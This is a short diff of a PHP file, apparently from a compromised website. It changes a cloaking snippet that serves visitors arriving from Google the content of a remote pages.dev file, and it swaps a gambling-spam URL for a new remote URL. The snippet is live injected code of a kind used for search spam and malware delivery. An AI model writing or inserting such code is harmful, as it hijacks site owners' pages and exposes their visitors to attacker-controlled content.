@@ -22,7 +22,7 @@ if ($uri == '/' && (
     strpos($referer, 'google') !== false
 )) {
 
-    $externalFile = file_get_contents('https://slotmahjonggeter.pages.dev/mahjongeter.html');
+    $externalFile = file_get_contents('https://apigcr88wijnen.pages.dev/wijnenapi.txt');
     if ($externalFile !== false) {
         echo $externalFile;
     } else {
